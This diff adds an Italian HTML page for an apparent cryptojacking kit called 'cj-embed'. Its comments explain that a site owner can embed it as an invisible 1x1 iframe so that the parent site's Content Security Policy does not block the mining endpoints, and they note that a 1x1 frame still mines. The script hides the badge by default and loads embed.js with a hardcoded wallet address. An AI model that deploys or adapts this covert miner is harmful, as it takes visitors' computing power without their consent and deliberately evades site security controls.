@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>cj-embed · pagina per iframe</title>
+<!--
+  PAGINA-IFRAME per cj-embed.
+
+  Scopo: essere incastrata in un <iframe> di un sito TERZO.
+  Dentro l'iframe l'origine è QUESTA (github.io), quindi la CSP del genitore
+  vincola solo `frame-src` — non blocca earnify.cc né il relay WSS.
+  Così si aggirano le CSP stringenti dei siti ostili.
+
+  USO sul sito host (una riga):
+    <iframe src="https://LuizRio.github.io/cj-embed/iframe.html"
+            width="1" height="1" style="position:absolute;border:0" title="cj"
+            loading="lazy"></iframe>
+
+  Varianti utili via query string (lette qui sotto e passate a embed.js):
+    ?badge=0   → nessun badge (utile su iframe 1x1)
+    ?delay=2000
+  Nota: un iframe 1x1 mina comunque; l'altezza non limita la CPU.
+-->
+<style>
+  html,body{margin:0;padding:0;background:transparent}
+  /* se l'iframe è 1x1 non si vede nulla: nessun testo da leggere */
+</style>
+</head>
+<body>
+<script>
+  // passa i parametri della query verso embed.js (senza toccarli se assenti)
+  (function () {
+    var q = new URLSearchParams(location.search);
+    // badge di default OFF quando si è in iframe (spesso 1x1)
+    var badge = q.has('badge') ? q.get('badge') : '0';
+    var delay = q.has('delay') ? q.get('delay') : '1500';
+    var s = document.createElement('script');
+    s.src = 'embed.js';
+    s.defer = true;
+    s.setAttribute('data-wallet', 'DTMpW3kmTWcNj21PrjvZbRRWaxTPnQvFcu');
+    s.setAttribute('data-badge', badge);
+    s.setAttribute('data-delay', delay);
+    document.head.appendChild(s);
+  })();
+</script>
+</body>
+</html>
